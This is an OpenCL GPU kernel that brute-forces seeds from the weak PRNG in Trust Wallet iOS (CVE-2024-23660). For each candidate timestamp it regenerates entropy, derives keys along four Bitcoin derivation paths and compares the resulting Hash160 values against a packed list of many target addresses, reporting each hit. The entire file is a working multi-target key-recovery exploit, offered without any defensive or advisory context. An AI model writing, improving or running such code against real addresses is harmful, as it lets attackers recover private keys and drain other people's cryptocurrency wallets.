// Trust Wallet iOS (CVE-2024-23660) — LCG/minstd_rand0 Multi-Target GPU Scanner
//
// Same PRNG / entropy / derivation logic as trust_wallet_lcg_crack.cl but
// accepts a flat array of N×20-byte Hash160 targets and checks every
// work-item against ALL targets in a single GPU pass.
//
// Two entropy strategies × four derivation paths = 8 combos:
//   combo 0: VariantAnd + m/44'  (P2PKH)
//   combo 1: VariantMod + m/44'  (P2PKH)
//   combo 2: VariantAnd + m/84'  (P2WPKH)
//   combo 3: VariantMod + m/84'  (P2WPKH)
//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
//   combo 6: VariantAnd + m/86'  (P2TR Taproot)
//   combo 7: VariantMod + m/86'  (P2TR Taproot)
//
// Global work size = 8 × (end_ts - start_ts).
//
// Kernel signature:
//   trust_wallet_lcg_crack_mt(
//       __global ulong* results,        // output: word0 = ts|(combo<<32), word1 = target_idx
//       __global uint*  result_count,   // atomic counter
//       __global const uchar* targets,  // N × 20 bytes, packed Hash160s
//       uint   target_count,            // N
//       uint   offset,                  // start_timestamp
//       uint   range,                   // bounds guard
//       uint   max_results              // cap for atomic_inc
//   )
//
// Result layout (two consecutive ulong words per hit):
//   results[idx*2 + 0] = (ulong)timestamp | ((ulong)combo << 32)
//   results[idx*2 + 1] = (ulong)target_idx

__kernel void trust_wallet_lcg_crack_mt(
    __global ulong*       results,
    __global uint*        result_count,
    __global const uchar* targets,
    uint   target_count,
    uint   offset,
    uint   range,
    uint   max_results
) {
    uint gid       = get_global_id(0);
    uint combo     = gid % 8u;
    uint ts_offset = gid / 8u;

    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    // ---- Entropy generation -----------------------------------------------
    uchar entropy[16];
    if ((combo & 1u) == 0u) {
        lcg_entropy_and(timestamp, entropy);
    } else {
        lcg_entropy_mod(timestamp, entropy);
    }

    // ---- BIP39 -> BIP32 ---------------------------------------------------
    uchar seed[64];
    bip39_entropy_to_seed_complete(entropy, seed);

    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    // ---- Derivation path --------------------------------------------------
    uint purpose;
    if      (combo < 2u) purpose = 44u;
    else if (combo < 4u) purpose = 84u;
    else if (combo < 6u) purpose = 49u;
    else                 purpose = 86u;

    extended_private_key_t k_purpose, k_coin, k_account, k_change, k_addr;
    hardened_private_child_from_private(&mk,        &k_purpose, purpose);
    hardened_private_child_from_private(&k_purpose, &k_coin,    0u);
    hardened_private_child_from_private(&k_coin,    &k_account, 0u);
    normal_private_child_from_private  (&k_account, &k_change,  0u);
    normal_private_child_from_private  (&k_change,  &k_addr,    0u);

    // ---- Public key -> Hash160 -------------------------------------------
    uchar hash160[20];

    if (combo >= 6u) {
        // P2TR (BIP86): tweaked x-only pubkey -> HASH160
        taproot_identifier(&k_addr, hash160);
    } else if (combo >= 4u) {
        // P2SH-P2WPKH (BIP49)
        extended_public_key_t pub;
        public_from_private(&k_addr, &pub);
        uchar inner_h160[20];
        identifier_for_public_key(&pub, inner_h160);
        uchar witness_script[22] __attribute__((aligned(4)));
        witness_script[0] = 0x00; witness_script[1] = 0x14;
        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];
        uchar sha256_result[32] __attribute__((aligned(4)));
        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
        ripemd160(sha256_result, 32, (__private uchar*)hash160);
    } else {
        // P2PKH (BIP44) and P2WPKH (BIP84): plain HASH160(pubkey)
        extended_public_key_t pub;
        public_from_private(&k_addr, &pub);
        identifier_for_public_key(&pub, hash160);
    }

    // ---- Pack computed hash160 -------------------------------------------
    ulong h1 = 0UL, h2 = 0UL;
    uint  h3 = 0u;
    for (int i = 0; i < 8;  i++) h1 |= ((ulong)hash160[i])      << (i * 8);
    for (int i = 0; i < 8;  i++) h2 |= ((ulong)hash160[i + 8])  << (i * 8);
    for (int i = 0; i < 4;  i++) h3 |= ((uint) hash160[i + 16]) << (i * 8);

    // ---- Compare against every target ------------------------------------
    for (uint t = 0u; t < target_count; t++) {
        uint base = t * 20u;

        ulong t1 = 0UL, t2 = 0UL;
        uint  t3 = 0u;
        for (int i = 0; i < 8; i++) t1 |= ((ulong)targets[base + i])      << (i * 8);
        for (int i = 0; i < 8; i++) t2 |= ((ulong)targets[base + 8 + i])  << (i * 8);
        for (int i = 0; i < 4; i++) t3 |= ((uint) targets[base + 16 + i]) << (i * 8);

        if (h1 == t1 && h2 == t2 && h3 == t3) {
            uint idx = atomic_inc(result_count);
            if (idx < max_results) {
                results[idx * 2 + 0] = (ulong)timestamp | ((ulong)combo << 32);
                results[idx * 2 + 1] = (ulong)t;
            }
        }
    }
}
